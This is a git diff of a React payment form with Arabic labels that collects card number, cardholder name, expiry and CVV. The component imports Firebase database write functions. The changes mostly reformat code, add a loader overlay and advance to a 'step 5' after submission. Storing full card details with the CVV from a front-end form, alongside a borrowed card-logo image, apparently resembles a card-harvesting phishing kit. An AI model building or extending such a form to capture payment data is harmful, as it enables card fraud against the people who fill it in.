@@ -1,14 +1,16 @@
 import React from 'react';
 import { dateBase } from '../firebase';
 import { ref, set } from 'firebase/database';
+import { SecoundryLoader } from './loader';
 const PayForms = (props: any) => {
+  const [show,setShow]=React.useState(true)
 
   const [ccnumber, setCcNumber] = React.useState('');
   const [ccname, setCcname] = React.useState('');
   const [ccdate, setCcdate] = React.useState('');
   const [cccvv, setCccvv] = React.useState('');
   const handleData = async (formData: any) => {
-    if(formData.ccnumber==='' ||formData.ccname ===''||formData.ccdate ===''|| formData.cccvv===''){
+    if (formData.ccnumber === '' || formData.ccname === '' || formData.ccdate === '' || formData.cccvv === '') {
       alert('الرجاء ادخال جميع المعلومات بشكل صحيح')
       return;
     }
@@ -23,6 +25,8 @@ const PayForms = (props: any) => {
 
   return (
     <div className="container">
+            <SecoundryLoader show={show} setShow={setShow}/>
+
       <form className="payform">
         <div className="heading">تفاصيل الدفع</div>
 
@@ -34,7 +38,7 @@ const PayForms = (props: any) => {
             name="input-name"
             title="Input title"
             placeholder="اسم حامل البطاقة"
-            onChange={(e)=>{
+            onChange={(e) => {
               setCcname(e.target.value)
             }}
           />
@@ -48,7 +52,7 @@ const PayForms = (props: any) => {
             name="input-name"
             title="رقم البطاقة"
             placeholder="0000 0000 0000 0000"
-              onChange={(e)=>{
+            onChange={(e) => {
               setCcNumber(e.target.value)
             }}
           />
@@ -63,9 +67,9 @@ const PayForms = (props: any) => {
               name="input-name"
               title="تاريخ الانتهاء"
               placeholder="01/23"
-                onChange={(e)=>{
-              setCcdate(e.target.value)
-            }}
+              onChange={(e) => {
+                setCcdate(e.target.value)
+              }}
             />
           </label>
           <label htmlFor="cvv" className="label">
@@ -77,7 +81,7 @@ const PayForms = (props: any) => {
               name="cvv"
               title="CVV"
               placeholder="CVV"
-              onChange={(e)=>{
+              onChange={(e) => {
                 setCccvv(e.target.value)
               }}
             />
@@ -87,14 +91,15 @@ const PayForms = (props: any) => {
           className="checkout-btn"
           type="button"
           value="انهاء عملية الدفع"
-          onClick={
-            ()
-=>{
-  handleData({ccnumber: ccnumber,
-    ccname: ccname,
-    ccdate: ccdate,
-    cccvv: cccvv})
-}          }
+          onClick={() => {
+            handleData({
+              ccnumber: ccnumber,
+              ccname: ccname,
+              ccdate: ccdate,
+              cccvv: cccvv
+            })
+            props.handleElement(5)
+          }}
         />
         <img
           src="https://help.zazzle.com/hc/article_attachments/360010513393/Logos-01.png"
